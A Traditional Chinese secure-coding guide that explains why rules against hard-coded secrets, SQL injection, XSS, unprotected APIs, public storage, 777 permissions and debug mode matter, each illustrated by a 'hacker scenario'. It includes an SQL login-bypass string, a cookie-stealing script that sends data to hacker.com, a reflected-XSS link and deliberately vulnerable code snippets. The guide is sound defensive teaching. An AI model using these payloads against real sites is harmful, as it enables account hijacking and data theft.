# Vibe Coding 安全守則詳解：為什麼我們如此堅持？

這份文件解釋了《安全守則》中每一條規則的重要性。理解這些，能幫助你從「駭客的視角」看待自己的程式碼，防患於未然。

---

## ⭐ 金科玉律 (The Golden Rules)

### 【絕不寫死秘密】 & 【使用環境變數】 & 【忽略秘密檔案】

**為什麼重要？**

這三條是數位世界的最高生存法則。你的程式碼（尤其是在使用 Git 時）會在多個地方被複製、分享、儲存。將密碼、API 金鑰等「秘密」直接寫在程式碼裡，就像是把保險箱的密碼刺青在額頭上，任何看到你的人（看到程式碼的人）都能輕易地打開你的保險箱。`.env` 檔案是你的私人保險箱，`.gitignore` 則是確保這個保險箱不會被意外打包送人的保全系統。

**駭客劇本 😈**
> 我最喜歡在 GitHub 上搜尋 `password`、`api_key` 或 `db_connect`。我找到了你的公開專案，在一個叫做 `config.js` 的檔案裡，我看到了這樣的程式碼：`const db_password = 'Password123!';`。太棒了，我甚至不需要攻擊你的網站，我現在就可以直接嘗試用這個密碼登入你的資料庫了。

**災難後果 💥**

**服務完全被接管。** 駭客可以偷走、竄改、刪除你所有的用戶資料，或是利用你的付費 API 服務（例如：發送大量郵件、使用地圖服務）來進行非法活動，而帳單全部由你支付。

---

## 📥 處理使用者輸入 (Handling User Input)

### 【防止注入攻擊 (SQL Injection)】

**為什麼重要？**

想像一下，資料庫是一個只聽得懂 SQL 語言的機器人。如果你把使用者的話（輸入）直接跟你的命令拼接在一起，使用者就有機會說出他們自己的「命令」。參數化查詢則是告訴機器人：「聽著，接下來這段話**只是資料**，無論內容是什麼，都不要當作命令來執行。」

**駭客劇本 😈**
> 我在你網站的登入框裡，用戶名稱我輸入了 `' OR '1'='1' --`。我猜你們的 SQL 查詢是這樣寫的：`"SELECT * FROM users WHERE username = '" + userInput + "';" `。我的輸入把它變成了 `SELECT * FROM users WHERE username = '' OR '1'='1' --';`。`'1'='1'` 永遠是真的，所以我繞過了密碼驗證，成功登入了第一個用戶（通常是管理員）的帳號。

**災難後果 💥**

攻擊者可以繞過登入、竊取整個資料庫的資料（用戶列表、密碼 hash），甚至刪除資料庫。

### 【防止跨站腳本攻擊 (XSS)】

**為什麼重要？**

如果你的網站像一面鏡子，直接反射出使用者輸入的內容，那使用者就可以在內容中夾帶惡意的 JavaScript 腳本。當其他用戶瀏覽到這段內容時，這個惡意腳本就會在他們的瀏覽器上執行，竊取他們的資訊。HTML 實體編碼就是把惡意腳本中的特殊字元（如 `<`、`>`）轉變成無害的純文字，讓它無法被執行。

**駭客劇本 😈**
> 我在你的文章評論區留了一段言：`<script>fetch('https://hacker.com/steal?cookie=' + document.cookie)</script>`。這段文字被原封不動地存進資料庫。現在，任何讀取這篇評論的用戶，他們的瀏覽器都會自動執行這段腳本，將他們的登入 cookie 發送到我的伺服器。我拿到了 cookie，就能冒充他們的身分登入網站。

**進階攻擊手法：為什麼 A 輸入的程式碼能竊取 B 的資料？**

很多人會困惑：「攻擊者並沒有修改我的網站，為什麼能偷到其他用戶的資料？」讓我用一個完整的例子來解釋：

1. **攻擊者 A 製作惡意連結**
   ```
   https://yoursite.com/detail.php?id=1<script>steal()</script>
   ```

2. **攻擊者透過社交工程誘騙受害者 B**
   - Email：「快來看這個攝影師的作品！」
   - 社群媒體、論壇留言等

3. **受害者 B 點擊連結後發生什麼事？**
   ```php
   // 你的程式碼（有漏洞）
   <meta property="og:url" content="<?php echo $_SERVER['REQUEST_URI']; ?>">
   
   // 實際輸出到 B 的瀏覽器
   <meta property="og:url" content="/detail.php?id=1<script>steal()</script>">
   ```

4. **為什麼能竊取 B 的資料？**
   - B 已經登入你的網站
   - 惡意腳本在**你的網域**下執行，因此可以：
     - 讀取 B 的 cookie（登入憑證）
     - 存取 B 的 localStorage
     - 以 B 的身份發送請求
     - 修改頁面內容（例如：假登入表單）

**簡單比喻**
想像你的網站是一家銀行：
- 攻擊者 A 在銀行大廳放了一張「假提款單」（惡意腳本）
- 客戶 B 以為是真的，填寫了密碼
- A 就得到了 B 的密碼

XSS 就是讓攻擊者能在你的「銀行大廳」（網站）放置「假提款單」（惡意程式碼）。

這就是為什麼要用 `htmlspecialchars()` - 它能確保所有使用者輸入都被當作純文字顯示，而不是可執行的程式碼。

**災難後果 💥**

大規模的用戶帳號被盜用、個資外洩、網站被植入釣魚內容或挖礦腳本。

---

## 🔐 權限與認證 (Permissions & Authentication)

### 【API 端點保護】

**為什麼重要？**

前端介面（UI）可以隱藏按鈕，但駭客從不依賴介面。他們會直接用工具（如 Postman、curl）呼叫你後端的 API。你必須假設每個 API 端點都會被直接攻擊，因此每個端點都必須是獨立的守衛，自己檢查來訪者的身分和權限。

**駭客劇本 😈**
> 我發現要修改個人資料，前端會發送一個請求到 `/api/user/update`。雖然我看不到其他人的修改按鈕，但我猜這個 API 可能是透過 `userId` 來區分用戶的。我試著發送一個請求到 `/api/user/update?userId=1`（管理員的 ID），並附上我想修改的資料。天啊，伺服器居然沒有檢查是不是我本人發出的請求，就成功把管理員的 email 改掉了！

**災難後果 💥**

普通用戶可以竄改其他用戶甚至管理員的資料，或是執行他們不該有的權限，造成系統混亂。

---

## ☁️ 外部服務與雲端整合 (External Services & Cloud Integration)

### 【外部資料庫防火牆】 & 【雲端儲存私有化】

**為什麼重要？**

你的雲端資料庫和儲存空間，就像是你在雲上的私人倉庫。你絕不會把倉庫的大門敞開，讓全世界的人都能進來。防火牆和私有化設定，就是為你的倉庫建立一道堅固的圍牆和上鎖的大門，只允許你的應用程式（指定的 IP 位址）這輛「授權貨車」進出。

**駭客劇本 😈**
> 我用工具掃描了你們公司的 IP 段，發現一個 AWS S3 儲存桶是「公開」的。我點進去一看，裡面全是你們用戶上傳的身份證照片和公司合約的掃描檔，所有檔案列表一覽無遺，我全部都下載了。

**災難後果 💥**

所有儲存的敏感資料（用戶個資、公司機密文件）被一次性拖走，造成毀滅性的資料外洩事件。

---

## ⚙️ 檔案與伺服器設定 (Files & Server Config)

### 【絕不用 777】

**為什麼重要？**

權限 `777` 的意思是「讀、寫、執行」權限對「擁有者、群組、其他人」全部開放。這就像是你家大門沒上鎖，而且還貼了張紙條寫著「歡迎任何人進來居住、塗鴉、開派對」。如果駭客能上傳一個檔案，`777` 權限就等於給了他執行這個檔案的權力。

**駭客劇本 😈**
> 我發現你們網站的圖片上傳功能有一個小漏洞，沒有嚴格限制我上傳的檔案類型。我把一個叫 `shell.php` 的惡意後門程式，偽裝成 `image.jpg.php` 上傳了。因為你們的上傳目錄權限是 `777`，伺服器允許我「執行」這個檔案。我現在只要訪問 `yoursite.com/uploads/shell.php`，就能在你們的伺服器上為所欲為了。

**災難後果 💥**

伺服器被完全攻陷。駭客可以竊取所有程式碼和資料、將你的伺服器變成發動網路攻擊的殭屍主機，或植入勒索病毒。

### 【關閉偵錯模式】

**為什麼重要？**

偵錯模式是開發時的好幫手，但在上線環境中，它就像一個喋喋不休的內鬼。當網站出錯時，它會把伺服器的內部路徑、資料庫查詢語句、設定變數等極度敏感的資訊，完整地顯示在錯誤頁面上，等於是給駭客提供了一份詳細的攻擊地圖。

**駭客劇本 😈**
> 我故意在你網站的搜尋框輸入一些特殊字元，讓程式出錯。網站立刻回傳了一個詳細的錯誤頁面，上面寫著 `Error in /var/www/html/app/models/User.php on line 52`，還附上了出錯的 SQL 查詢語句。我現在知道了你們的檔案結構、使用的程式框架，甚至是資料表的名稱。我的下一步攻擊將會精準得多。

**災難後果 💥**

洩漏大量內部系統資訊，大幅降低駭客的攻擊難度，讓他們能更快地找到真正的漏洞。